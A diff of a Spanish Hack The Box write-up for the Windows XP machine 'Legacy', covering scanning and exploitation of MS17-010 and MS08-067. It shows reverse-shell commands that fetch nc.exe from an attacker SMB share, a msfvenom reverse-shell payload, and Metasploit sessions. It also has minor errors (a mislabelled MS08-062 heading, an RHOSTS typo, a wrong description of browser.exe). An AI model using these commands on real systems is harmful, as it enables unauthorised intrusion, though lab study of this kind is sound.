@@ -13,23 +13,25 @@ categories:
   - Easy Machine
 tags:
   - Windows
-  - Samba
   - SMB
-  - Remote Command Execution (RCE) 
-  - RCE - MS17-010
-  - Eternal Blue
+  - Remote Command Execution (RCE)
+  - Eternal Blue - MS17-010
+  - Reverse Shell
   - Microsoft Windows Server Code Execution - MS08-067
   - OSCP Style
-  - Metasploit
+  - Metasploit Framework
 ---
 ![](/assets/images/htb-writeup-legacy/legacy_logo.png)
-Una máquina no tan complicada, ya que vamos a utilizar un Exploit que ya hemos usado antes con la **máquina Blue**, la diferencia radica en los **named pipes** activos en el servicio **Samba** que está activo, hay varias manera de aprovecharnos de este, vamos a probar 3 diferentes.
+Una máquina no tan complicada, ya que vamos a utilizar un Exploit que ya hemos usado antes con la **máquina Blue**, la diferencia radica en los **named pipes** activos en el **servicio SMB** que está activo, hay varias manera de aprovecharnos de este, vamos a probar 3 diferentes.
 
-**OJO**: Me apoye en la forma que S4vitar utilizo y HackerSploit usando Metasploit, aquí los links de los videos:
-* https://www.youtube.com/watch?v=RuWkPH_Vecg
-* https://www.youtube.com/watch?v=uV6WNOfP8s8
-
-Les doy creditos a S4vitar pues andaba atorado en la forma de acceder a la maquina usando Eternal Blue y a HackerSploit por su forma de usar el exploit MS08-067 ya que cuando investigue los servicios de la maquina aparecio dicho exploit y abajo un video suyo.
+Herramientas utilizadas:
+* *nmap*
+* *smbclient*
+* *python2*
+* *Impacket*
+* *msfvenom*
+* *nc*
+* *metasploit framework*
 
 
 <br>
@@ -45,16 +47,21 @@ Les doy creditos a S4vitar pues andaba atorado en la forma de acceder a la maqui
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
+				<li><a href="#SMB">Investigando Vulnerabilidades con NMAP</a></li>
 				<li><a href="#Exploit">Buscando un Exploit</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#Exploit2">Configurando y Usando un Exploit</a></li>
+				<li><a href="#Exploit2">Configurando y Usando Exploit eternalBlue de GitHub</a></li>
+				<ul>
+					<li><a href="#Descarga">Descargando Exploit e Investigando las Named Pipes</a></li>
+					<li><a href="#Configure">Configurando Exploit para su Uso</a></li>
+				</ul>
 			</ul>
 		<li><a href="#Otras">Otras Formas</a></li>
                         <ul>
-                                <li><a href="#Metas">Exploit de Metasploit</a></li>
-                                <li><a href="#Metas2">Usando Metasploit</a></li>
+                                <li><a href="#Exploit3">Variante de Exploit eternalBlue de GitHub</a></li>
+                                <li><a href="#Exploit4">Usando Exploit MS08-062 de Metasploit</a></li>
                         </ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -76,7 +83,7 @@ Les doy creditos a S4vitar pues andaba atorado en la forma de acceder a la maqui
 <h2 id="Ping">Traza ICMP</h2>
 
 Realizamos un ping hacia la máquina para ver si está conectada y con el TTL vemos que tipo SO ocupa.
-```
+```bash
 ping -c 4 10.10.10.4         
 PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
 64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=131 ms
@@ -92,7 +99,7 @@ Gracias al TLL sabemos que es una máquina con Windows, ahora hagamos los escane
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
 
-```
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG allPorts                         
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 13:53 CST
@@ -116,20 +123,23 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds
            Raw packets sent: 114947 (5.058MB) | Rcvd: 36606 (1.464MB)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Solamente hay 3 puertos abiertos y ya conocidos, por lo que sabemos que la máquina está usando el servicio **Samba**. Aun así, hagamos el escaneo de servicios.
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
+
+Solamente hay 3 puertos abiertos y ya conocidos, observa que está usando el **servicio SMB** y vemos un puerto desconocido. Hagamos el escaneo de servicios.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
-```
+```bash
 nmap -sC -sV -p135,139,445 10.10.10.4 -oN targeted                                             
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 13:57 CST
 Nmap scan report for 10.10.10.4
@@ -161,13 +171,16 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
-* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
-* -p: Para indicar puertos específicos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Al parecer, podemos conectarnos al servicio **Samba** como usuarios sin autenticación. Vamos a tratar de listar los recursos compartidos, a ver si nos deja.
-```
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+Al parecer, podemos conectarnos al **servicio SMB** como usuarios sin autenticación. Vamos a tratar de listar los recursos compartidos.
+```bash
 smbclient -L 10.10.10.4 -N 
 session setup failed: NT_STATUS_INVALID_PARAMETER
 ```
@@ -186,16 +199,68 @@ No pues no, entonces es momento de investigar por internet un Exploit que nos si
 <br>
 
 
+<h2 id="SMB">Investigando Vulnerabilidades con NMAP</h2>
+
+Como ya vimos, la máquina ocupa el **servicio SMB**, vamos a aplicar algunos comandos con **nmap** para saber si tiene alguna vulnerabilidad:
+
+```bash
+nmap --script "vuln and safe" -p 445 10.10.10.4 -oN vulns
+Starting Nmap 7.93 ( https://nmap.org ) CST
+Nmap scan report for 10.10.10.4
+Host is up (0.078s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
+```
+Excelente, ya nos dieron todo lo que necesitamos. 
+
+Incluso, podemos comprobar la versión del **servicio SMB** que estan usando, si es la **versión SMBv1**, quiere decir que es casi totalmente vulnerable:
+```bash
+nmap --script smb-protocols -p 445 10.10.10.4
+Starting Nmap 7.93 ( https://nmap.org ) CST
+Nmap scan report for 10.10.10.4
+Host is up (0.078s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-protocols: 
+|   dialects: 
+|_    NT LM 0.12 (SMBv1) [dangerous, but default]
+
+Nmap done: 1 IP address (1 host up) scanned in 10.88 seconds
+```
+Listo, es momento de buscar un Exploit para la máquina víctima.
+
 <h2 id="Exploit">Buscando un Exploit</h2>
 
-De acuerdo al escaneo de servicios, tenemos dos para buscar, aunque empecemos mejor por el servicio del puerto 445 y luego el puerto 139.
+De acuerdo al escaneo de servicios y de vulnerabilidades, debemos buscar Exploits para el **servicio SMB** en general.
 
-Investigando los dos, saltan a relusir dos Exploits:
-* MS08-067
-* MS17-010
+Investigando un poco, saltan a relusir dos Exploits:
+* *MS08-067*
+* *MS17-010*
 
-Que si no mal recuerdo, el **MS17-010** es el **Eternal Blue**. El otro que encontramos lo utiliza Metasploit así que vamos a probar primero con el **Eternal Blue**.
-```
+Que como podras ver, el **MS17-010** es el **Eternal Blue**. El otro que encontramos lo utiliza **Metasploit**, así que vamos a probar primero con el **Eternal Blue**.
+```bash
 searchsploit MS17-010               
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                             |  Path
@@ -210,11 +275,7 @@ Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Executi
 Shellcodes: No Results
 Papers: No Results
 ```
-Vamos a analizar este Exploit: **Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)** pues usa **Samba** para la ejecución de código remoto, veamos que se cuece ahí.
-
-Después de analizarlo, no creo que nos vaya a servir porque dicho Exploit solo sirve para Windows 7 y 2008, y al parecer la máquina que estamos haciendo usa Windows XP. Entonces vamos a buscar un Exploit en internet sobre el **MS17-010**.
-
-¡WUALA! Aparece el GitHub que uso el tito S4vitar y que fue uno de los que probe después en la máquina Blue, vamos a probarlo aquí para que vean cómo funciona.
+Si recordamos un poco la **máquina Blue**, estariamos haciendo lo mismo que hicimos aquella vez al momento de utilizar el Exploit del EternalBlue, por lo que, vamos a repetir el mismo proceso, pero vamos a utilizar la versión de GitHub, ya que es un poco más estable esa versión, al ser ideada para usarse en cualquier versión de Windows, pues parece ser que esta máquina usa un Windows XP. lo cual nos puede traer problemas con las versiones de este Exploit que ocupemos.
 
 
 <br>
@@ -229,11 +290,13 @@ Después de analizarlo, no creo que nos vaya a servir porque dicho Exploit solo 
 <br>
 
 
-<h2 id="Exploit2">Configurando y Usando un Exploit</h2>
+<h2 id="Exploit2">Configurando y Usando Exploit eternalBlue de GitHub</h2>
+
+<h3 id="Descarga">Descargando Exploit e Investigando las Named Pipes</h3>
 
 Vamonos por pasos:
-* Descargamos el GitHub: https://github.com/worawit/MS17-010
-```
+* Descargamos el **GitHub**:** https://github.com/worawit/MS17-010**
+```bash
 git clone https://github.com/worawit/MS17-010       
 Clonando en 'MS17-010'...
 remote: Enumerating objects: 183, done.
@@ -241,26 +304,26 @@ remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
 Recibiendo objetos: 100% (183/183), 113.61 KiB | 908.00 KiB/s, listo.
 Resolviendo deltas: 100% (102/102), listo.
 ```
-* Entramos al directorio y vemos que hay dentro:
-```
+* Entramos al directorio:
+```bash
 ls
 BUG.txt                  eternalblue_poc.py       eternalromance_leak.py  eternalsynergy_poc.py  README.md
 checker.py               eternalchampion_leak.py  eternalromance_poc2.py  infoleak_uninit.py     shellcode
 eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py               zzz_exploit.py
 eternalblue_exploit8.py  eternalchampion_poc.py   eternalsynergy_leak.py  npp_control.p
 ```
-* Si vemos el Readme del GitHub, hay 2 scripts que nos pueden ayudar:
+* Recuerda que hay 2 scripts que vamos a usar:
   * checker.py
   * zzz_exploit.py
 
-Porque el checker va a buscar un acceso a los **named pipes** y el **zzz_exploit** sirve en servicios Windows del 2000 para arriba. Ahora vamos a usar primero el checker.
+El **checker.py** va a buscar un acceso a los **named pipes** y el **zzz_exploit.py** es el EternalBlue, configurado para que sirve en **servicios Windows del 2000 para arriba**. 
 
-OJO: para usar el checker, hay que usar Python 2, porque usando Python 3 o Python no funciona:
-```
+* Ahora vamos a usar primero el **checker.py**. **OJO**: Recuerda que para usar el **checker.py**, hay que usar **Python2**:
+```bash
 python2 checker.py 10.10.10.4
 Target OS: Windows 5.1
 The target is not patched
-
+.
 === Testing named pipes ===
 spoolss: Ok (32 bit)
 samr: STATUS_ACCESS_DENIED
@@ -268,36 +331,51 @@ netlogon: STATUS_ACCESS_DENIED
 lsarpc: STATUS_ACCESS_DENIED
 browser: Ok (32 bit)
 ```
-Ya vimos 2 **named pipes** con **OK**, lo que quiere decir que son vulnerables y el zzz_exploit usara para ganar acceso a la página. Es momento de analizar el Exploit:
+Ya vimos 2 **named pipes** con **OK**, lo que quiere decir que pueden ser vulnerables y son los que el **zzz_exploit.py**, usara para ganar acceso a la máquina. Es momento de configurar el Exploit.
 
-```
+<br>
+
+<h3 id="Configure">Configurando Exploit para su Uso</h3>
+
+Abre el script **zzz_exploit.py** y modifica las siguientes lineas:
+
+```bash
 USERNAME = ''
 PASSWORD = ''
 
 smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
         service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
 ```
-Nos pide 2 parámetros, los cuales no tenemos de momento y están esos 2 códigos que estan en la funcion **smb_pwn**. Entonces es similar este Exploit al que usamos en la máquina Blue. Aquí la desventaja es que no nos podemos loguear en el servicio **Samba** por lo que hacer un **.exe** como en la máquina Blue es una pérdida de tiempo, lo que podemos probar es si con **spoolss** o browser podemos inyectar código.
+Nos pide 2 parámetros, los cuales no tenemos de momento y están esos 2 lineas de código, que estan en la función **smb_pwn**. Aquí, la desventaja es que no nos podemos loguear en el **servicio SMB** a diferencia de lo que podiamos hacer en la máquina Blue. Lo que podemos probar es, si con la **named pipe spoolss** o **browser** podemos inyectar código.
 
-Pero, ¿qué es spoolss y browser?
+Pero, ¿qué son las **named pipes spoolss y browser**?
 
-**Spoolsv.exe es el servidor de API del administrador de colas. Se implementa como un servicio Windows 2000 (o posterior) que se inicia cuando se inicia el sistema operativo. Este módulo exporta una interfaz RPC al lado servidor de la API win32 del administrador de colas.**
+| **Spoolss.exe** |
+|:-----------:|
+| *El spoolss.exe es un proceso que pertenece a Microsoft Windows Operating System. El archivo se carga en la memoria principal (RAM) y funciona ahí como un proceso de Microsoft Printer Spooler Subsystem (también denominado una tarea).El archvio spoolss.exe es un proceso del sistema necesario para que su PC funcione correctamente. No debe eliminarse* |
 
-**Browser es un acceso por red al servidor de Windows**
+<br>
 
-Entonces sería mejor probar por el Browser para ver si se puede inyectar código, intentemos lanzar una Traza ICMP:
+| **Browser.exe** |
+|:-----------:|
+| *Browser.exe es un proceso legítimo asociado a navegadores web como Google Chrome, Mozilla Firefox y Microsoft Edge. Forma parte del archivo ejecutable del navegador y se encarga de iniciarlo y ejecutarlo. Al abrir un navegador web, se inicia el proceso Browser.exe, que permanece activo hasta que se cierra el navegador. Browser es un acceso por red al servidor de Windows* |
 
-```
+<br>
+
+Entonces sería mejor probar por el **Browser** para ver si se puede inyectar código, intentemos lanzar una **Traza ICMP** de la máquina víctima, hacia nuestra máquina. Para hacer esto, modifiquemos el script **zzz_exploit.py**, para que aplique el ping a nuestra máquina:
+```bash
 service_exec(conn, r'cmd /c ping Tu_IP')
 ```
-Levantamos un servidor con **tcpdump** para que capture la traza:
-```
+
+Levantamos un servidor con **tcpdump** para que capture la traza y con esto comprobamos si se inyecto el comando o no:
+```bash
 tcpdump -i tun0 icmp -n
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
+
 Probamos el Exploit:
-```
+```bash
 python2 zzz_exploit.py 10.10.10.4 browser
 Target OS: Windows 5.1
 Groom packets
@@ -316,11 +394,11 @@ modify transaction struct for arbitrary read/write
 make this SMB session to be SYSTEM
 ...
 ```
-Vaya, vaya, entonces si es vulnerable, vamos a intentar subir una netcat por ahí para tratar de conectarnos de manera remota a la máquina. Vamos por pasos:
+Observa como en el **tcpdump** esta capturando la **traza ICMP**, entonces si es posible la inyección de comandos, osea que la máquina es vulnerable. Vamos a intentar subir una **netcat** desde ahí, para tratar de conectarnos de manera remota a la máquina. Vamos por pasos:
 
-* Busquemos una netcat, si estas en kali y ahí hay una, solo tiene que buscarla con el comando **locate** y copiarla donde la vayas a ocupar:
+* Busquemos una **netcat**, en Kali ya tenemos una por defecto, solo tienes que buscarla con el comando **locate** y copiarla donde la vayas a ocupar:
 
-```
+```bash
 locate nc.exe 
 /usr/share/seclists/Web-Shells/FuzzDB/nc.exe
 /usr/share/windows-resources/binaries/nc.exe
@@ -331,14 +409,15 @@ checker.py               eternalblue_poc.py       eternalromance_leak.py  eterna
 eternal-blue.exe         eternalchampion_leak.py  eternalromance_poc2.py  infoleak_uninit.py      npp_control.py  zzz_exploit.py
 eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py                __pycache__
 ```
-* Ahora dentro del Exploits vamos a indicar lo siguiente:
-```
+
+* Ahora dentro del script **zzz_exploit.py**, vamos a indicar lo siguiente:
+```bash
 service_exec(conn, r'cmd /c \\Tu_IP\smbFolder\nc.exe -e cmd Tu_IP Cualquier_Puerto')
 ```
-Esto lo que hará será descargar la netcat de un servidor de **smb** creado con **impacket** y que se alzará en la carpeta en donde tengamos la **nc.exe**.
+Esto lo que hará, será descargar la **netcat** de un servidor **SMB** que vamos a crear con **impacket** y que se alzará en la carpeta en donde tengamos la **nc.exe**.
 
-* Ahora vamos a alzar dicho servidor:
-```
+* Ahora vamos a alzar el **servidor SMB**:
+```bash
 smbserver.py smbFolder $(pwd)
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
@@ -348,16 +427,17 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 [*] Config file parsed
 ```
-* Una vez alzado, activamos una netcat aparte:
-```
+* Una vez alzado, activamos una **netcat** en nuestra máquina. Aca puedes usar tambien **rlwrap**, pero no lo veo tan necesario, por eso usamos **netcat**:
+```bash
 nc -nvlp 443           
 listening on [any] 443 ...
 ```
-* Por último activamos el Exploit y listo:
-```
-c -nvlp 443           
+
+* Por último, activamos el Exploit y listo:
+```bash
+nc -nvlp 443           
 listening on [any] 443 ...
-connect to [10.10.14.9] from (UNKNOWN) [10.10.10.4] 1037
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.4] 1037
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 C:\WINDOWS\system32>whoami
@@ -365,10 +445,10 @@ whoami
 'whoami' is not recognized as an internal or external command,
 operable program or batch file.
 ```
+Gracias al **Eternal Blue**, entramos directamente como **NT Authority System**, aunque me parece extraño que no podamos usar el comando **whoami**. 
 
-Quizá aquí no lo mencione, pero gracias al **Eternal Blue** entramos directamente como Root o en este caso como **Authority System**. 
 * Ya solo buscamos las flags y ya tendríamos lista esta máquina:
-```
+```bash
 C:\WINDOWS\system32>cd C:\
 cd C:\
 C:\>dir
@@ -399,15 +479,7 @@ dir
                0 File(s)              0 bytes
                5 Dir(s)   6.403.964.928 bytes free
 ```
-Las flags están en **John** y **Administrator**
-
-**NOTA**
-
-Para saber qué clase de vulnerabilidades tiene la máquina también pudimos usar el siguiente script de nmap:
-```
-nmap --script "vuln and safe" -p445 10.10.10.4
-```
-Y este nos mostraba que la máquina era vulnerable al **Eternal Blue**, no lo recordaba e incluso lo tengo anotado en la solución de la maquina Blue jeje.
+Las flags están en **John** y **Administrator**.
 
 
 <br>
@@ -422,9 +494,9 @@ Y este nos mostraba que la máquina era vulnerable al **Eternal Blue**, no lo re
 <br>
 
 
-Bueno, existen otras dos formas de poder ganar acceso a esta máquina, una será usando el Exploit de Metasploit y la otra será usando Metasploit en sí, así que vamos a probar con el Exploit de Metasploit.
+Bueno, existen otras dos formas de poder ganar acceso a esta máquina, una será usando una variante del Exploit de **GitHub** que ya usamos, y la otra será usando el **Metasploit Framework**, así que, primero vamos a probar la variante.
 
-<h2 id="Metas">Exploit de Metasploit</h2>
+<h2 id="Exploit3">Variante de Exploit eternalBlue de GitHub</h2>
 
 Esta forma la encontré usando el método que se usó en el siguiente link: 
 
@@ -434,34 +506,27 @@ Vamos a descargar el siguiente repositorio:
 
 * https://github.com/helviojunior/MS17-010
 
-Este que contiene una variante del zzz_exploit.py que por así decirlo nos automatiza un poco el proceso, pues ya solo tendríamos que comentar un par de líneas y debemos hacer un Payload con msfvenom como en la máquina Blue.
-```
+Este que contiene una variante del **zzz_exploit.py** que, por así decirlo, nos automatiza un poco el proceso, pues ya solo tendríamos que comentar un par de líneas y debemos crear un Payload con **Msfvenom** como en la **máquina Blue**.
+```bash
 git clone https://github.com/helviojunior/MS17-010.git
 Clonando en 'MS17-010'...
 remote: Enumerating objects: 202, done.
 remote: Total 202 (delta 0), reused 0 (delta 0), pack-reused 202
 Recibiendo objetos: 100% (202/202), 118.50 KiB | 905.00 KiB/s, listo.
 Resolviendo deltas: 100% (115/115), listo.
-
+.
 ls
 BUG.txt                  eternalblue_poc.py       eternalromance_leak.py  eternalsynergy_poc.py  npp_control.py       zzz_exploit.py
 checker.py               eternalchampion_leak.py  eternalromance_poc2.py  infoleak_uninit.py     README.md
 eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py               send_and_execute.py
 eternalblue_exploit8.py  eternalchampion_poc.py   eternalsynergy_leak.py  mysmb.pyc              shellcode
 ```
-La variante se llama **send_and_execute** y vamos a modificar la función **send_and_execute** con lo siguiente:
-```
-smb_send_file(smbConn, lfile, 'C', '/windows/temp/%s' % filename)
-        service_exec(conn, r'cmd /c c:\windows\temp\%s' % filename)
-```
-Comentamos esas dos líneas agregando un **#** y agregamos paréntesis al print que está arriba:
-```
-filename = "%s.exe" % random_generator(6)
-        print ("Sending file %s..." % filename)
-```
-Muy bien, ahora hagamos el Payload con msfvenom:
-```
-msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.9 LPORT=443 -o Eternal_Blue.exe
+
+* La variante se llama **send_and_execute.py** y no es necesario que la modifiquemos, pero si necesitamos un Payload que será una Reverse Shell para podernos conectar a la máquina víctima.
+
+* Muy bien, ahora hagamos el Payload con **Msfvenom**:
+```bash
+msfvenom -p windows/shell_reverse_tcp -f exe LHOST=Tu_IP LPORT=443 -o Eternal_Blue.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder specified, outputting raw payload
@@ -469,21 +534,24 @@ Payload size: 324 bytes
 Final size of exe file: 73802 bytes
 Saved as: Eternal_Blue.exe
 ```
-Si bien esta es una forma, también podemos especificar lo que no pusimos que es la plataforma y la arquitectura así:
-```
-msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.9 LPORT=443 EXITFUNC=thread -a x86 --platform windows -o Eternal_Blue.exe
+
+* Si bien esta es una forma, también podemos especificar la plataforma y la arquitectura del sistema operativo así:
+```bash
+msfvenom -p windows/shell_reverse_tcp -f exe LHOST=Tu_IP LPORT=443 EXITFUNC=thread -a x86 --platform windows -o Eternal_Blue.exe
 No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Final size of exe file: 73802 bytes
 Saved as: Eternal_Blue.exe
 ```
-Ya con esto tenemos todo preparado, ya solo activamos una netcat antes del final:
-```
+
+* Ya con esto tenemos todo preparado, ya solo activamos una **netcat** antes del final:
+```bash
 nc -nvlp 443
 listening on [any] 443 ...
 ```
-Y activamos el Exploit:
-```
+
+* Y activamos el Exploit:
+```bash
 python2 send_and_execute.py 10.10.10.4 Eternal_Blue.exe                                    
 Trying to connect to 10.10.10.4:445
 Target OS: Windows 5.1
@@ -497,29 +565,30 @@ CONNECTION: 0x86059da8
 SESSION: 0xe228e3e8
 ...
 ```
-Vemos la netcat y ya estamos dentro:
-```
+
+* Vemos la **netcat** y ya estamos dentro:
+```bash
 nc -nvlp 443
 listening on [any] 443 ...
-connect to [10.10.14.9] from (UNKNOWN) [10.10.10.4] 1038
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.4] 1038
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
-
+.
 C:\WINDOWS\system32>whoami
 whoami
 'whoami' is not recognized as an internal or external command,
 operable program or batch file.
-
+.
 C:\WINDOWS\system32>cd C:\
 cd C:\
-
+.
 C:\>dir
 dir
  Volume in drive C has no label.
  Volume Serial Number is 54BF-723B
-
+.
  Directory of C:\
-
+.
 16/03/2017  08:30 ��                 0 AUTOEXEC.BAT
 16/03/2017  08:30 ��                 0 CONFIG.SYS
 16/03/2017  09:07 ��    <DIR>          Documents and Settings
@@ -530,12 +599,13 @@ dir
                4 File(s)         73.802 bytes
                3 Dir(s)   6.403.895.296 bytes free
 ```
-OJO: aquí lo que hace es cargar el archivo **ETYX3D.exe**, dicho archivo es el que se crea en la función **send_and_execute**, así que este es el que entiendo hace la conexión hacia nuestra netcat.
+**Nota**: 
+Aquí lo que hace es cargar el archivo **ETYX3D.exe**, dicho archivo es el que se crea en la función **send_and_execute**, así que este es el que entiendo hace la conexión hacia nuestra **netcat**.
 
-<h2 id="Metas2">Usando Metasploit</h2>
+<h2 id="Exploit4">Usando Exploit MS08-062 de Metasploit</h2>
 
-Como había mencionado antes, había encontrado el **MS08-062**, bueno este se encuentra en Metasploit y se puede usar. Vamos a activar el Metasploit:
-```
+Como había mencionado antes, había encontrado el **MS08-062**, bueno este se encuentra en el **Metasploit Framework** y lo podemos usar. Vamos a activar el **Metasploit**:
+```bash
 msfdb start                                                                                
 [+] Starting database
 msfconsole
@@ -584,71 +654,76 @@ Metasploit tip: Enable verbose logging with set VERBOSE
 true                                                                                                                                                 
 Metasploit Documentation: https://docs.metasploit.com/
 ```
-Buscamos el Exploit:
-```
-msf6 > search MS08-067
 
+* Buscamos el Exploit:
+
+```bash
+msf6 > search MS08-067
+.
 Matching Modules
 ================
-
+.
    #  Name                                 Disclosure Date  Rank   Check  Description
    -  ----                                 ---------------  ----   -----  -----------
    0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
-
-
+.
 Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi
 ```
-Usamos el Exploit:
-```
+
+* Usamos el siguiente modulo:
+```bash
 msf6 > use exploit/windows/smb/ms08_067_netapi
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 ```
-Y le pedimos que nos muestre las opciones:
-```
+
+* Y le pedimos que nos muestre las opciones:
+```bash
 msf6 exploit(windows/smb/ms08_067_netapi) > show options
-
+.
 Module options (exploit/windows/smb/ms08_067_netapi):
-
+.
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    RPORT    445              yes       The SMB service port (TCP)
    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
-
-
+.
+.
 Payload options (windows/meterpreter/reverse_tcp):
-
+.
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
-
-
+.
+.
 Exploit target:
 
    Id  Name
    --  ----
    0   Automatic Targeting
 ```
-Justo ahí indica que usara el **named pipe Browser**, ya solo es cosa de darle el RHOSTS y el LHOST:
-```
-msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
-RHOSTS => 10.10.10.4
-msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.9
-LHOST => 10.10.14.9
-```
-Iniciamos el Exploit y listo:
-```
-msf6 exploit(windows/smb/ms08_067_netapi) > exploit
 
-[*] Started reverse TCP handler on 10.10.14.9:4444 
+* Justo ahí indica que usara el **named pipe Browser**, ya solo es cosa de darle el **RHOSTS** y el **LHOST**:
+```bash
+msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.40
+RHOSTS => 10.10.10.4
+msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST Tu_IP
+LHOST => Tu_IP
+```
+
+* Iniciamos el Exploit y listo:
+```bash
+msf6 exploit(windows/smb/ms08_067_netapi) > exploit
+.
+[*] Started reverse TCP handler on Tu_IP:4444 
 [*] 10.10.10.4:445 - Automatically detecting the target...
 [*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
 [*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
 [*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
 [*] Sending stage (175686 bytes) to 10.10.10.4
-[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.4:1040) at 2023-03-27 16:53:43 -0600
+[*] Meterpreter session 1 opened (Tu_IP:4444 -> 10.10.10.4:1040) at 2023-03-27 16:53:43 -0600
 meterpreter > sysinfo
 Computer        : LEGACY
 OS              : Windows XP (5.1 Build 2600, Service Pack 3).
